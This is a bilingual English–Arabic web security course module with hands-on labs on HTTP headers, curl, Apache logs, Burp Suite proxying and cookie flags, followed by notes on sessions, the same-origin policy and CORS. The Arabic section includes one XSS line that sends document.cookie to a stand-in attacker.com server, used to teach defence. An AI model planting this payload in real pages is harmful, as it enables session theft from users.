Guided Labالمختبر الموجَّه

≈7h · Step by step, with expected results≈7ساعات · خطوة بخطوة مع النتائج المتوقعة

Everything below runs inside VirtualBox. The browser labs run on the Ubuntu VM; curl and Burp run from Kali. Both VMs stay on the NAT Network from Week 1.

Lab 7.1 — Read the wire with DevTools (1.5h)

Goal: See that a web page is not a thing — it is a transcript.

Setup: Ubuntu VM, Firefox or Chromium, any site. Open DevTools (F12) → Network tab. Tick "Persist Logs".

Steps:

  1. Clear the log, then load one page. You should see dozens of requests, not one. Sort by size. Which request is the HTML document?
  2. Click the first request (the document). Read, in this order: the request line (GET /path HTTP/1.1), then the Headers panel → Request Headers, then Response Headers, then the Response tab.
  3. Write down, by hand: the URL, the method, the Host, User-Agent, Referer, Accept, the response status, Content-Type, Content-Length, and every Set-Cookie.
  4. Find an image, a CSS file, and a JS file in the list. Compare their Content-Type values.
  5. Reload the page. Find the second load of the CSS file — note the status (304) and explain in your notes what the browser avoided downloading.
  6. Go to Storage → Cookies. Find the session cookie. Note every attribute: name, value, HttpOnly, Secure, SameSite, Path, Expires.
  7. Open the Console. Run document.cookie and record what you see. Then compare with the cookie list from step 6.

Expected output: A hand-written table with 8–10 request/response headers you can explain, and a session cookie whose attributes you can name.

If you see this → it means:

Symptom Cause
Network tab is empty on load DevTools was opened after the page loaded — reload with it open
document.cookie shows less than the Storage panel That cookie is HttpOnly — deliberately hidden from JavaScript. This is the whole point of the flag
Almost everything is 200 from cache Disable cache checkbox (or Ctrl+Shift+R)
Status shows (from disk cache) Not a network request at all — the browser answered locally

Lab 7.2 — The same requests, by hand, with curl (1.5h)

Goal: Prove that the browser is a convenience, not a requirement.

Setup: Kali VM. curl is preinstalled.

Steps:

  1. Recreate the document request from Lab 7.1 without a browser: 

    curl -v https://example.com/ -o /tmp/page.html
    -v makes curl print the request it sent and the response headers. Lines starting with > are what curl sent; < is what the server sent. Read both fully.

  2. Add headers yourself and watch the server change its answer: 

    curl -v -A "MentorBot/1.0" https://example.com/
curl -v -e "https://google.com" https://example.com/

  3. Follow a redirect manually and observe the 3xx chain: 

    curl -v http://example.com/ 2>&1 | grep -E "^< HTTP|^< Location"
    Then add -L and see curl follow it for you.

  4. Make a POST with a body and a content type: 

    curl -v -X POST https://httpbin.org/post \
  -H "Content-Type: application/json" \
  -d '{"user":"analyst","role":"viewer"}'
    Read the JSON echo. This is exactly what a browser does when you submit a form — nothing more.

  5. Compare: in DevTools, right-click the document request → Copy as cURL. Paste it into Kali and run it. You have just replayed a browser request from the command line.

Expected output: A curl -v transcript you can annotate line by line, plus a working replayed request copied from the browser.

If you see this → it means:

Symptom Cause
curl: (60) SSL certificate problem Use -k only in the lab, and note why disabling certificate validation is a real-world attack (Week 6)
Nothing prints until the whole response arrives -v writes to stderr — add 2>&1 when piping
Host header rejected / default site served The server routes by Host; without it you hit the default vhost
Replayed curl returns a login page instead of content Your session cookie wasn't included — add -b "session=..."

Lab 7.3 — Your own web server and its access log (1.5h)

Goal: Own both ends of the conversation.

Setup: Ubuntu VM.

Steps:

  1. Install Apache: sudo apt update && sudo apt install -y apache2. Confirm http://localhost/ serves the default page.
  2. Find the config: ls /etc/apache2/. Open sites-available/000-default.conf and identify DocumentRoot, the Listen port, and the log directives.
  3. Create your own page at /var/www/html/lab.html with a title, a heading, and a link. Reload it in the browser.

  4. Watch the log live in a second terminal: 

    sudo tail -f /var/log/apache2/access.log
    Now hit the page from Kali's browser at http://<ubuntu-ip>/lab.html. Read the new line and identify every field.

  5. Produce one entry of each kind while the log tails: a normal 200, a 404 (request a path that doesn't exist), and a 304 (reload the page you already have cached).

  6. Add a deliberately odd request and find it later: 

    curl -A "Nmap Scripting Engine" "http://<ubuntu-ip>/admin"
    Find it in the log. This is what a scanner looks like from the server's side.

  7. Open error.log too. Note the difference: access log = who asked for what; error log = what went wrong.

Expected output: /var/log/apache2/access.log containing your 200, your 404, your 304, and your scanner user-agent — with each field explained in your notes.

If you see this → it means:

Symptom Cause
Kali can't reach http://<ubuntu-ip>/ Apache not started, or ufw blocking port 80 — sudo systemctl status apache2, sudo ufw allow 80
Log lines have - for the username field Normal: the request was unauthenticated. That field is only populated by HTTP auth, not by your app's login — a classic beginner misunderstanding
Nothing appears in access.log You're tailing the wrong vhost's log, or the request never arrived (check error.log)

Lab 7.4 — Burp Suite as a proxy, and breaking a cookie (2.5h)

Goal: Put yourself between the browser and the server — then prove why cookie flags exist.

Setup: Kali VM. Burp Suite Community is preinstalled (also available from portswigger.net/burp/communitydownload).

Steps:

  1. Launch Burp → Temporary project → Use Burp defaults. Read the getting-started guide.
  2. In Proxy → Proxy settings, confirm the listener is 127.0.0.1:8080.
  3. Point your Kali browser at the proxy (Firefox: Settings → Network Settings → Manual proxy → 127.0.0.1:8080). Confirm traffic appears in Proxy → HTTP history.
  4. Turn Intercept on (Proxy → Intercept → Intercept is on). Browse to http://<ubuntu-ip>/lab.html. The request is now frozen in your hands. Read it. Then change the User-Agent and forward it. Confirm the change survives.
  5. Send a request to Repeater (Ctrl+R), and from Repeater resend it five times, editing one thing each time: the path, the Referer, a query parameter, a cookie value. You are now doing manually what a scanner automates.

  6. Now break the cookie. On the Ubuntu VM, create /var/www/html/cookie.html: 

    <h1>Cookie lab</h1>
<script>document.write("JS can see: " + document.cookie);</script>
    Load it. Then in the browser console on that page run document.cookie = "session=SECRET123; path=/" and reload. The value is printed on the page — that is exactly what theft looks like.

  7. Now do it with the flag set. JavaScript cannot set HttpOnly — that is the point: only the server can, via a Set-Cookie response header. So first delete the step-6 cookie (DevTools → Storage → Cookies → http://<ubuntu-ip> → right-click → Delete), then add a cookie named session with value SECRET123 and tick HttpOnly (a real server would send Set-Cookie: session=SECRET123; HttpOnly). Reload the page: the value no longer appears. Confirm in Storage that the cookie still exists — the browser still sends it to the server on every request; JavaScript simply cannot read it.

  8. Write up: if an attacker could run one line of JavaScript on this page, which cookie would they get, and which one would they be locked out of?

⚠️ Steps 6–7 are done on your own local page, on your own VM. Modifying a cookie on a system you do not own is not an exercise, it is an intrusion.

Expected output: A Burp HTTP history containing at least five requests you edited, plus two screenshots: one cookie value visible from JavaScript, the same value invisible under HttpOnly.

If you see this → it means:

Symptom Cause
Browser shows "connection refused" after proxy setup Burp not running, or the listener is on a different port
HTTPS sites fail with certificate warnings Expected — Burp is MITM-ing your own traffic with its own CA. For Community Edition, stick to http:// lab targets
Intercept is on but nothing stops Intercept filters are excluding it, or the response came from browser cache
document.cookie returns nothing for the cookie you expect The cookie's Path doesn't match the page path, or it is HttpOnly (which is the answer you want in step 7)

كل ما يلي يعمل داخل VirtualBox. مختبرات المتصفح تُنفَّذ على آلة Ubuntu الوهمية؛ أما curl و Burp فيُشغَّلان من Kali. تبقى الآلتان على شبكة NAT Network من الأسبوع 1.

المختبر 7.1 — اقرأ ما يجري على السلك باستخدام DevTools (1.5 ساعة)

الهدف: أن ترى أن صفحة الويب ليست شيئاً واحداً — بل نصّ محادثة.

التهيئة: آلة Ubuntu الوهمية، Firefox أو Chromium، أي موقع. افتح DevTools (F12) → تبويب Network. فعّل خيار "Persist Logs".

الخطوات:

  1. امسح السجل، ثم حمّل صفحة واحدة. يجب أن ترى عشرات الطلبات، لا طلباً واحداً. رتّب حسب الحجم. أي طلب هو مستند HTML؟
  2. انقر على الطلب الأول (المستند). اقرأ بهذا الترتيب: سطر الطلب (GET /path HTTP/1.1)، ثم لوحة Headers → Request Headers، ثم Response Headers، ثم تبويب Response.
  3. اكتب بخط يدك: عنوان URL، والطريقة، و Host و User-Agent و Referer و Accept، ورمز حالة الاستجابة، و Content-Type و Content-Length، وكل ترويسة Set-Cookie.
  4. جد صورة، وملف CSS، وملف JS في القائمة. قارن قيم Content-Type لديها.
  5. أعد تحميل الصفحة. جد التحميل الثاني لملف CSS — لاحظ رمز الحالة (304) واشرح في ملاحظاتك ما الذي تجنّب المتصفح تنزيله.
  6. اذهب إلى Storage → Cookies. جد كوكي الجلسة. سجّل كل سمة: الاسم، القيمة، HttpOnly، Secure، SameSite، Path، Expires.
  7. افتح Console. نفّذ document.cookie وسجّل ما تراه. ثم قارنه بقائمة الكوكيز من الخطوة 6.

المخرج المطلوب: جدول مكتوب بخط اليد فيه 8–10 من ترويسات الطلب/الاستجابة تستطيع شرحها، وكوكي جلسة تستطيع تسمية سماته.

إذا رأيت هذا → فهذا معناه:

العَرَض السبب
تبويب Network فارغ عند التحميل فُتح DevTools بعد تحميل الصفحة — أعد التحميل وهو مفتوح
document.cookie يعرض أقل من لوحة Storage ذلك الكوكي HttpOnly — مخفي عن الجافاسكربت عن قصد. وهذا هو جوهر هذه السمة بالكامل
كل شيء تقريباً 200 من الذاكرة المؤقتة فعّل خيار تعطيل الذاكرة المؤقتة (Disable cache)، أو استخدم Ctrl+Shift+R
الحالة تعرض (from disk cache) ليس طلب شبكة إطلاقاً — المتصفح أجاب محلياً

المختبر 7.2 — الطلبات نفسها، يدوياً، باستخدام curl (1.5 ساعة)

الهدف: أثبت أن المتصفح وسيلة راحة، وليس شرطاً.

التهيئة: آلة Kali الوهمية. curl مثبَّت مسبقاً.

الخطوات:

  1. أعد إنشاء طلب المستند من المختبر 7.1 بدون متصفح: 

    curl -v https://example.com/ -o /tmp/page.html
    -v تجعل curl يطبع الطلب الذي أرسله و ترويسات الاستجابة. الأسطر التي تبدأ بـ > هي ما أرسله curl؛ و < هو ما أرسله السيرفر. اقرأ الاثنين كاملين.

  2. أضف ترويسات بنفسك وشاهد السيرفر يغيّر جوابه: 

    curl -v -A "MentorBot/1.0" https://example.com/
curl -v -e "https://google.com" https://example.com/

  3. تتبّع إعادة توجيه يدوياً ولاحظ سلسلة 3xx: 

    curl -v http://example.com/ 2>&1 | grep -E "^< HTTP|^< Location"
    ثم أضف -L وشاهد curl يتبعه نيابة عنك.

  4. نفّذ طلب POST بجسم ونوع محتوى: 

    curl -v -X POST https://httpbin.org/post \
  -H "Content-Type: application/json" \
  -d '{"user":"analyst","role":"viewer"}'
    اقرأ صدى JSON. هذا بالضبط ما يفعله المتصفح عند إرسال نموذج — لا أكثر.

  5. قارن: في DevTools، انقر بزر الفأرة الأيمن على طلب المستند → Copy as cURL. الصقه في Kali ونفّذه. لقد أعدت للتوّ تشغيل طلب متصفح من سطر الأوامر.

المخرج المطلوب: نصّ curl -v كامل تستطيع التعليق عليه سطراً بسطر، بالإضافة إلى طلب مُعاد تشغيله بنجاح ومنسوخ من المتصفح.

إذا رأيت هذا → فهذا معناه:

العَرَض السبب
curl: (60) SSL certificate problem استخدم -k في المختبر فقط، وسجّل لماذا يُعدّ تعطيل التحقق من الشهادة هجوماً واقعياً (الأسبوع 6)
لا يُطبع شيء حتى تصل الاستجابة كاملة -v يكتب إلى stderr — أضف 2>&1 عند التمرير عبر أنبوب
ترويسة Host مرفوضة / يُخدَم الموقع الافتراضي السيرفر يوجّه حسب Host؛ بدونها تصطدم بالمضيف الافتراضي (default vhost)
curl المُعاد تشغيله يعيد صفحة تسجيل دخول بدل المحتوى كوكي جلستك لم يُضمَّن — أضف -b "session=..."

المختبر 7.3 — خادم الويب الخاص بك وسجل الوصول (1.5 ساعة)

الهدف: امتلك طرفي المحادثة.

التهيئة: آلة Ubuntu الوهمية.

الخطوات:

  1. ثبّت Apache: sudo apt update && sudo apt install -y apache2. تأكد أن http://localhost/ يخدم الصفحة الافتراضية.
  2. جد الإعدادات: ls /etc/apache2/. افتح sites-available/000-default.conf وحدّد DocumentRoot، ومنفذ Listen، وتوجيهات السجلات.
  3. أنشئ صفحتك الخاصة في /var/www/html/lab.html بعنوان وترويسة ورابط. أعد تحميلها في المتصفح.

  4. راقب السجل مباشرةً في طرفية ثانية: 

    sudo tail -f /var/log/apache2/access.log
    الآن اطلب الصفحة من متصفح Kali على http://<ubuntu-ip>/lab.html. اقرأ السطر الجديد وحدّد كل حقل فيه.

  5. أنتج سطراً من كل نوع بينما السجل يُتابع مباشرة: 200 عادي، و 404 (اطلب مساراً غير موجود)، و 304 (أعد تحميل الصفحة المخزّنة لديك مسبقاً).

  6. أضف طلباً غريباً عن قصد ثم جده لاحقاً: 

    curl -A "Nmap Scripting Engine" "http://<ubuntu-ip>/admin"
    جده في السجل. هكذا يبدو الماسح من جهة السيرفر.

  7. افتح error.log أيضاً. لاحظ الفرق: سجل الوصول = مَن طلب ماذا؛ سجل الأخطاء = ما الذي أخفق.

المخرج المطلوب: /var/log/apache2/access.log يحتوي على 200 و 404 و 304 الخاصة بك، ووكيل المستخدم الخاص بالماسح — مع شرح كل حقل في ملاحظاتك.

المختبر 7.4 — Burp Suite كوسيط، وكسر كوكي (2.5 ساعة)

الهدف: ضع نفسك بين المتصفح والسيرفر — ثم أثبت لماذا توجد سمات الكوكي.

التهيئة: آلة Kali الوهمية. Burp Suite Community مثبَّت مسبقاً (متاح أيضاً من portswigger.net/burp/communitydownload).

الخطوات:

  1. شغّل Burp → Temporary project → Use Burp defaults. اقرأ دليل البدء.
  2. في Proxy → Proxy settings، تأكد أن المستمع (listener) على 127.0.0.1:8080.
  3. وجّه متصفح Kali إلى الوسيط (Firefox: Settings → Network Settings → Manual proxy → 127.0.0.1:8080). تأكد أن الحركة تظهر في Proxy → HTTP history.
  4. شغّل Intercept (Proxy → Intercept → Intercept is on). تصفّح إلى http://<ubuntu-ip>/lab.html. الطلب الآن مجمّد بين يديك. اقرأه. ثم غيّر User-Agent ومرّره (Forward). تأكد أن التغيير وصل.
  5. أرسل طلباً إلى Repeater (Ctrl+R)، ثم أعد إرساله من Repeater خمس مرات، وعدّل شيئاً واحداً في كل مرة: المسار، و Referer، ومعامل استعلام (query parameter)، وقيمة كوكي. أنت الآن تفعل يدوياً ما يؤتمته الماسح.

  6. الآن اكسر الكوكي. على آلة Ubuntu الوهمية، أنشئ /var/www/html/cookie.html: 

    <h1>Cookie lab</h1>
<script>document.write("JS can see: " + document.cookie);</script>
    حمّلها. ثم في طرفية المتصفح (console) على تلك الصفحة نفّذ document.cookie = "session=SECRET123; path=/" وأعد التحميل. القيمة تُطبع على الصفحة — هكذا تبدو السرقة بالضبط.

  7. الآن افعلها والسمة مضبوطة. الجافاسكربت لا يستطيع ضبط HttpOnly — وهذا هو المقصد: السيرفر وحده يستطيع، عبر ترويسة استجابة Set-Cookie. لذا احذف أولاً كوكي الخطوة 6 (DevTools → Storage → Cookies → http://<ubuntu-ip> → زر الفأرة الأيمن → Delete)، ثم أضف كوكياً باسم session وقيمته SECRET123 وفعّل HttpOnly (السيرفر الحقيقي كان سيرسل Set-Cookie: session=SECRET123; HttpOnly). أعد تحميل الصفحة: القيمة لم تعد تظهر. تأكد في Storage أن الكوكي ما زال موجوداً — فالمتصفح ما زال يرسله إلى السيرفر مع كل طلب؛ لكن الجافاسكربت ببساطة لا يستطيع قراءته.

  8. اكتب: لو استطاع مهاجم تنفيذ سطر جافاسكربت واحد على هذه الصفحة، أي كوكي سيحصل عليه، وأي كوكي سيُحرَم منه؟

⚠️ الخطوتان 6–7 تُنفَّذان على صفحتك المحلية، على آلتك الوهمية. تعديل كوكي على نظام لا تملكه ليس تمريناً، بل هو اختراق.

المخرج المطلوب: سجل HTTP history في Burp يحتوي خمسة طلبات عدّلتها على الأقل، بالإضافة إلى لقطتي شاشة: قيمة كوكي ظاهرة من الجافاسكربت، والقيمة نفسها غير ظاهرة تحت HttpOnly.

Why this matters in securityلماذا يهم هذا أمنياً

The security consequenceالأثر الأمني

This week you learn that HTTP has no memory — and that almost every web security control exists to work around that fact.

Three things to internalize, and they are the spine of the next ten weeks:

  1. The cookie is the credential. When you log in, the server does not remember you. It hands you a random string and says "show me this and I'll believe you're you." Anyone who holds that string is you, for as long as it lives. This is session hijacking, and it is not an exotic exploit — it is the direct consequence of how sessions work. Steal the cookie, become the user. Which is why HttpOnly exists: it removes the cookie from JavaScript's reach, so that one injected line of script — an XSS — cannot simply read document.cookie and post it to an attacker's server. Flags are not decoration. Each one closes a specific, demonstrated attack.

  2. The same-origin policy is the boundary that makes the browser safe to use. Without it, a page from any site could read the responses from your bank, your email, your admin panel — because your browser is authenticated to all of them. The origin is scheme + host + port: http://bank.com and https://bank.com are different origins, and so are bank.com and bank.com:8080. Learn the exact definition now; you will spend the rest of your career finding applications that enforce it in the browser but forget to enforce anything on the server. CORS is the controlled relaxation of that boundary — a way for one origin to say "yes, that other origin may read me." Misconfigured CORS (trusting any origin, or trusting one that reflects whatever you send) simply deletes the boundary.

  3. Authentication and session management are two different systems, and confusing them is a real bug class. Authentication answers "who are you?" — once. Session management answers "how do I know it's still you?" — on every request afterwards. Applications that get authentication right and session management wrong are everywhere: they hash passwords properly, then issue a session ID that never changes after login (session fixation), or never expires, or is predictable. When a breach report says "authentication bypass," it very often means the second system failed, not the first.

And the honest lesson about the proxy: Burp Suite, DevTools, and curl -v are not "hacking tools." They are instruments for seeing what actually happens. Most people use a browser and have no idea a conversation took place. You now watch the conversation — and that change of perspective is the difference between a user and a security practitioner.

⚠️ Legal boundary, stated plainly. Intercepting, modifying, or replaying HTTP traffic is only lawful against (a) systems you own, (b) your own lab VMs, or (c) platforms that explicitly authorize it — PortSwigger Academy, OverTheWire Natas, and CTFs. Pointing Burp at a website you do not own and do not have written permission to test is not "practice," it is unauthorized access, and it is a criminal offence in essentially every jurisdiction. There is no grey area here, and "I was just learning" is not a defence.

تتعلّم هذا الأسبوع أن HTTP بلا ذاكرة — وأن كل ضابط أمني في الويب تقريباً موجود للالتفاف حول هذه الحقيقة.

ثلاثة أمور يجب أن تستوعبها جيداً، وهي العمود الفقري للأسابيع العشرة القادمة:

  1. الكوكي هو بيان الاعتماد. عند تسجيل الدخول، لا يتذكّرك السيرفر. بل يسلّمك نصاً عشوائياً ويقول "أرِني هذا وأصدّق أنك أنت". ومن يحمل هذا النص هو أنت، ما دام حياً. هذا هو اختطاف الجلسة، وليس استغلالاً غريباً — بل نتيجة مباشرة لطريقة عمل الجلسات. اسرق الكوكي، تصبح المستخدم. ولهذا يوجد HttpOnly: فهو يبعد الكوكي عن متناول الجافاسكربت، حتى لا يستطيع سطر سكربت محقون واحد — أي XSS — أن يقرأ document.cookie ويرسله ببساطة إلى سيرفر المهاجم. السمات ليست زينة. كل واحدة منها تُغلق هجوماً محدداً ومُبرهَناً عليه.

  2. سياسة الأصل الواحد هي الحد الذي يجعل استخدام المتصفح آمناً. بدونها، تستطيع صفحة من أي موقع أن تقرأ استجابات بنكك وبريدك ولوحة تحكمك — لأن متصفحك مُصادَق على كل هذه المواقع. الأصل هو scheme + host + port: فـ http://bank.com و https://bank.com أصلان مختلفان، وكذلك bank.com و bank.com:8080. تعلّم التعريف الدقيق الآن؛ فستقضي بقية مسيرتك المهنية في إيجاد تطبيقات تطبّقه في المتصفح لكنها تنسى تطبيق أي شيء على السيرفر. أما CORS فهو الترخية المنظّمة لهذا الحد — طريقة يقول بها أصل ما "نعم، ذلك الأصل الآخر مسموح له بقراءتي". و CORS المُعدّ خطأً (الثقة بأي أصل، أو الثقة بأصل يكرّر ما ترسله) يمحو الحد بالكامل.

  3. المصادقة وإدارة الجلسة نظامان مختلفان، والخلط بينهما فئة ثغرات حقيقية. المصادقة تجيب عن "من أنت؟" — مرة واحدة. وإدارة الجلسة تجيب عن "كيف أعرف أنك ما زلت أنت؟" — مع كل طلب بعد ذلك. والتطبيقات التي تُحسن الأولى وتُفسد الثانية في كل مكان: تُشفّر كلمات المرور بشكل صحيح، ثم تُصدر معرّف جلسة لا يتغير بعد تسجيل الدخول (Session Fixation)، أو لا ينتهي أبداً، أو يمكن تخمينه. وعندما يقول تقرير اختراق "تجاوز مصادقة"، ففي أغلب الحالات النظام الثاني هو الذي فشل، لا الأول.

والدرس الصادق عن الوسيط: Burp Suite و DevTools و curl -v ليست "أدوات اختراق". إنها أدوات لرؤية ما يحدث فعلاً. معظم الناس يستخدمون المتصفح ولا يعلمون أن محادثة جرت أصلاً. أنت الآن تراقب المحادثة — وهذا التغيير في المنظور هو الفرق بين مستخدم وممارس أمني.

⚠️ الحد القانوني، بصراحة تامة. اعتراض حركة HTTP أو تعديلها أو إعادة تشغيلها لا يكون مشروعاً إلا ضد (أ) أنظمة تملكها، أو (ب) آلاتك الوهمية في مختبرك، أو (ج) منصات تُصرّح بذلك صراحةً — PortSwigger Academy و OverTheWire Natas و CTFs. توجيه Burp إلى موقع لا تملكه ولا تملك إذناً كتابياً باختباره ليس "تدريباً"، بل وصول غير مُصرَّح به، وهو جريمة جنائية في كل الأنظمة القانونية تقريباً. لا توجد منطقة رمادية هنا، و"كنت أتعلّم فقط" ليست دفاعاً.

الويب كله يقوم على فكرة واحدة بسيطة: المتصفح يرسل طلباً (Request)، والسيرفر يرد بـ استجابة (Response). ثم ينتهي كل شيء. لا علاقة دائمة، لا "اتصال مفتوح" بينهما.

تشريح الطلب (Request):

GET /login HTTP/1.1              ← سطر الطلب: الطريقة + المسار + الإصدار
Host: example.com                ← أي موقع تريد (سيرفر واحد يخدم مواقع كثيرة)
User-Agent: Mozilla/5.0 ...      ← من أنت (المتصفح ونظامك)
Referer: https://example.com/    ← من أين أتيت (الصفحة السابقة)
Cookie: session=abc123          ← هويتك الحالية
Accept: text/html               ← ما نوع المحتوى الذي تفهمه

تشريح الاستجابة (Response):

HTTP/1.1 200 OK                  ← سطر الحالة
Content-Type: text/html          ← نوع المحتوى القادم
Content-Length: 4821             ← حجمه بالبايت
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
                                 ← "احفظ هذا، وأرسله مع كل طلب قادم"

<!DOCTYPE html> ...              ← الجسم (HTML أو JSON أو صورة)

الطرق (Methods) ورموز الحالة (Status Codes)

الطريقة المعنى ملاحظة أمنية
GET اطلب بيانات يجب ألا تغيّر شيئاً — لكن كثير من المواقع تخالف ذلك
POST أرسل بيانات جديدة يُستخدم للنماذج وتسجيل الدخول
PUT استبدل مورداً بالكامل غالباً في الـ APIs
DELETE احذف مورداً لو لم يُفحص التخويل هنا، فهذه كارثة
HEAD مثل GET بدون جسم مفيد للفحص السريع

رموز الحالة — المهم هو الفئة، وليس الرقم:

الفئة المعنى أمثلة
1xx معلومة — الطلب قيد المعالجة 100 Continue
2xx نجاح 200 OK · 201 Created · 204 No Content
3xx إعادة توجيه 301 دائم · 302 مؤقت · 304 لم يتغير (من الذاكرة المؤقتة)
4xx خطأ من العميل — أنت أخطأت 401 لم تُصادق · 403 مصادق لكن ممنوع · 404 غير موجود
5xx خطأ من السيرفر 500 خطأ داخلي · 503 الخدمة غير متاحة

تمييز يجب أن يعلق في ذهنك: 401 تعني "من أنت؟ سجّل الدخول أولاً". 403 تعني "أعرف من أنت، ولن أسمح لك". الخلط بينهما في الكود يعني غالباً أن التحقق من الصلاحيات غائب — وهذا موضوع الأسبوع القادم بالكامل.

لماذا HTTP بلا ذاكرة (Stateless)؟ وكيف تُحل المشكلة؟

HTTP لا يتذكر شيئاً. كل طلب مستقل تماماً. السيرفر لا يعرف أن الطلب الثاني جاء من نفس الشخص الذي أرسل الأول. هذه ليست عيباً — بل هي سبب قابلية الويب للتوسع: أي سيرفر في المزرعة يستطيع خدمة أي طلب.

لكن المشكلة: كيف يبقى تسجيل الدخول فعالاً إن كان كل طلب "غريباً"؟

الحل على ثلاث طبقات:

1. الكوكي (Cookie) — ذاكرة في جهازك أنت

السيرفر يرسل في أول استجابة Set-Cookie: session=abc123. المتصفح يحفظها، ويرسلها تلقائياً في ترويسة Cookie مع كل طلب لاحق لذلك النطاق.

الطلب الأول:   POST /login   (اسم المستخدم وكلمة المرور)
الاستجابة:      Set-Cookie: session=abc123
الطلب التالي:  GET /dashboard
               Cookie: session=abc123      ← المتصفح أضافها تلقائياً

2. الجلسة (Session) — ذاكرة على السيرفر. السيرفر يحتفظ بجدول: abc123 ← المستخدم "ali"، مسجّل الدخول، صلاحياته كذا. الكوكي تحتوي معرّفاً فقط، وليس البيانات نفسها.

3. البديل: الرمز (Token). بدلاً من تخزين الجلسة على السيرفر، يُرسل رمز موقّع يحتوي البيانات نفسها (JWT مثلاً). لا يحتاج السيرفر لتخزين شيء، لكن لا يستطيع إبطاله فوراً.

المقارنة الجلسة (Session) الرمز (Token / JWT)
أين تُخزَّن الحالة على السيرفر داخل الرمز نفسه
إبطال فوري ممكن (احذف السجل) صعب جداً
قابلية التوسع تحتاج مخزناً مشتركاً ممتازة (لا حالة)
المخزون في المتصفح كوكي كوكي أو ذاكرة JS

الكوكيز وسمات الأمان — قلب أمان الويب

الكوكي مجرد نص، لكنه يُرسل تلقائياً — وهذا ما يجعله خطيراً. لأن المتصفح يرسله دون سؤالك، فأي شخص يملك قيمة الكوكي يصبح أنت.

السمة ماذا تفعل الهجوم الذي تمنعه
HttpOnly تمنع الجافاسكربت من قراءة الكوكي سرقة الكوكي عبر XSS
Secure ترسلها فقط عبر HTTPS اعتراضها على شبكة غير مشفرة
SameSite=Strict/Lax لا تُرسل الكوكي مع الطلبات القادمة من موقع آخر CSRF (تزوير الطلب عبر المواقع)
Path تحدد نطاق المسارات تقليل الانتشار
Expires / Max-Age مدة الصلاحية تقليل نافذة الاستغلال

مثال من الواقع — لماذا HttpOnly ضرورية؟

تخيّل أن الموقع فيه ثغرة XSS تسمح بحقن سطر جافاسكربت:

// لو لم تكن HttpOnly موجودة:
fetch("https://attacker.com/steal?c=" + document.cookie);

هذا السطر يرسل كوكي جلستك إلى سيرفر المهاجم في أجزاء من الثانية. بمجرد وصول الكوكي إلى المهاجم، يصبح هو أنت — دون أن يعرف كلمة مرورك أصلاً.

HttpOnly لا تمنع الجافاسكربت من التصرف بصلاحياتك (يمكنه إرسال طلبات باسمك)، لكنها تمنعه من قراءة الكوكي وسرقتها لاستخدامها لاحقاً ومن أي جهاز. هذا فرق دقيق ومهم.

سياسة الأصل الواحد (Same-Origin Policy) — الحدود التي تجعل التصفح آمناً

الأصل (Origin) = البروتوكول + النطاق + المنفذ. يجب أن تتطابق الثلاثة.

العنوان أ العنوان ب نفس الأصل؟ السبب
https://bank.com/a https://bank.com/b ✅ نعم نفس البروتوكول والنطاق والمنفذ
http://bank.com https://bank.com ❌ لا البروتوكول مختلف
https://bank.com https://mail.bank.com ❌ لا النطاق الفرعي مختلف
https://bank.com https://bank.com:8080 ❌ لا المنفذ مختلف

ماذا تحمي؟ تمنع صفحة من موقع "أ" من قراءة محتوى الاستجابات من موقع "ب". بدونها، أي صفحة تفتحها تستطيع قراءة بريدك وبنكك — لأن متصفحك مُصادَق على كل هذه المواقع بالكوكيز.

الخطأ الشائع والخطير: أن يعتمد المطوّر على سياسة الأصل الواحد للحماية ويقول "المتصفح يمنع ذلك". سياسة الأصل الواحد قيد على المتصفح، وليست قيداً على السيرفر. المهاجم لا يستخدم متصفحاً — يستخدم curl أو Burp. كل تحقق من الصلاحيات يجب أن يكون على السيرفر. هذه الجملة هي أهم جملة في هذين الأسبوعين.

CORS هو الاستثناء المنظّم: السيرفر يقول صراحة "أنا أثق بهذا الأصل الآخر واسمح له بالقراءة". إن كان الإعداد "أثق بأي أصل" أو "أكرّر الأصل الذي يرسله الطلب"، فقد حذفت الحدود بالكامل.

الوسيط (Proxy) — ترى كل شيء وتغيّر كل شيء

الوسيط برنامج يقف في المنتصف: متصفحك يرسل إليه، وهو يمرّر للسيرفر، ثم يعيد الاستجابة إليك.

ماذا يرى؟ كل شيء: المسار، الطريقة، كل ترويسة، كل كوكي، كل جسم الطلب والاستجابة.

ماذا يستطيع أن يغيّر؟ كل شيء أيضاً — هذا هو المنطق الذي تقوم عليه ثغرات الويب: لأن المدخلات تُعدَّل بسهولة، فإن أي تطبيق يثق بمدخلات المستخدم سيُخدع.

الاستثناء الوحيد: إن كان الاتصال HTTPS و تثبيت الشهادات مفعّلاً (certificate pinning)، يفشل الوسيط. هذا فرق جوهري بين Burp في يدك على جهازك، وبين مهاجم على الشبكة.

في تطبيقك العملي: Burp Suite و DevTools هما نفس الفكرة — نافذة على الحقيقة. الفرق أن Burp يسمح بتعديل الطلب قبل وصوله، وبتكراره مئات المرات.

المصادقة مقابل إدارة الجلسة — الخلط الذي يوقع الأنظمة

السؤال النظام المسؤول متى يُنفَّذ
من أنت؟ المصادقة (Authentication) مرة واحدة عند تسجيل الدخول
هل ما زلت أنت؟ إدارة الجلسة (Session Management) مع كل طلب
هل يُسمح لك بهذا؟ التخويل (Authorization) مع كل طلب حساس

الكثير من الأنظمة تُحسن الأول وتُفسد الثاني: تُشفّر كلمات المرور بشكل صحيح، ثم تُصدر معرّف جلسة لا يتغير بعد تسجيل الدخول (Session Fixation)، أو لا ينتهي أبداً، أو يمكن تخمينه. عندما تقرأ تقرير اختراق يقول "تجاوز المصادقة"، ففي أغلب الحالات النظام الثاني هو الذي فشل.
